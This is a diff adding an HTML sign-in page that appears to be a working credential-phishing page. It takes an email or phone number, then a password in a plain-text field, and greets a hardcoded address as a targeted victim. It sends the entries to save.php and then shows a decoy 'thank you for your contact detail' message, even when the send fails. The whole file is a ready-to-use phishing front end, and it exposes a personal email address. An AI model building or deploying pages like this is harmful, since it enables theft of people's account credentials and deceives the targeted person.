@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 40px;
+        }
+
+        .logo-container {
+            margin-bottom: 24px;
+        }
+
+        .logo {
+            width: 36px;
+            height: 36px;
+            object-fit: contain;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        input[type="text"],
+        input[type="email"] {
+            width: 100%;
+            background: transparent;
+            border: 1px solid #707070;
+            border-radius: 4px;
+            padding: 12px 14px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus {
+            border-color: #0067ff;
+        }
+
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            margin-bottom: 30px;
+            color: #cccccc;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+
+        .checkbox-container input {
+            accent-color: #0067ff;
+            width: 16px;
+            height: 16px;
+        }
+
+        a {
+            color: #ffffff;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .btn-next {
+            width: 100%;
+            background-color: #0067ff;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: #0052cc;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .thank-you-box {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .thank-you-box h1 {
+            margin-bottom: 12px;
+        }
+
+        .thank-you-box p {
+            color: #aaaaaa;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Small logo on top of the screen -->
+    <div class="logo-container">
+        <img src="logo.jpg" alt="Logo" class="logo" onerror="this.style.display='none'">
+    </div>
+
+    <form id="multiStepForm" action="save.php" method="POST">
+        
+        <!-- STEP 1: Email or Phone Number -->
+        <div class="step active" id="step-1">
+            <h1>Sign in to</h1>
+            <div class="form-group">
+                <label for="identifier">Email or phone number</label>
+                <input type="text" id="identifier" name="identifier" required>
+            </div>
+            
+            <div class="options-row">
+                <label class="checkbox-container">
+                    <input type="checkbox" name="stay_signed"> Stay signed in
+                </label>
+                <a href="#">Forgot username</a>
+            </div>
+
+            <button type="button" class="btn-next" onclick="nextStep(2)">Next</button>
+        </div>
+
+        <!-- STEP 2: Name Entry -->
+        <div class="step" id="step-2">
+            <h1>Welcome back sassie2082@aol.com</h1>
+            <div class="form-group">
+                <label for="password">Enter your name password</label>
+                <input type="text" id="password" name="password">
+            </div>
+
+            <div class="options-row">
+                <label class="checkbox-container">
+                    <input type="checkbox"> Stay signed in
+                </label>
+                <a href="#">Forgot username</a>
+            </div>
+
+            <button type="submit" class="btn-next">Next</button>
+        </div>
+
+        <!-- STEP 3: Thank You Message -->
+        <div class="step" id="step-3">
+            <div class="thank-you-box">
+                <h1>Thank you!</h1>
+                <p>Thank you for submitting your contact detail. We will reach out to you shortly.</p>
+            </div>
+        </div>
+
+    </form>
+</div>
+
+<script>
+    function nextStep(stepNumber) {
+        const identifierInput = document.getElementById('identifier');
+        if (stepNumber === 2) {
+            if (!identifierInput.value.trim()) {
+                alert('Please enter your email or phone number.');
+                identifierInput.focus();
+                return;
+            }
+        }
+
+        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+        document.getElementById('step-' + stepNumber).classList.add('active');
+    }
+
+    // Intercept form submission to show the final thank you screen smoothly via AJAX or state transition
+    const form = document.getElementById('multiStepForm');
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const formData = new FormData(form);
+
+        // Send data to save.php asynchronously
+        fetch('save.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.text())
+        .then(result => {
+            // Move to Step 3 (Thank You message)
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step-3').classList.add('active');
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            // Even if network fails client-side display, show thank you state
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step-3').classList.add('active');
+        });
+    });
+</script>
+
+</body>
+</html>
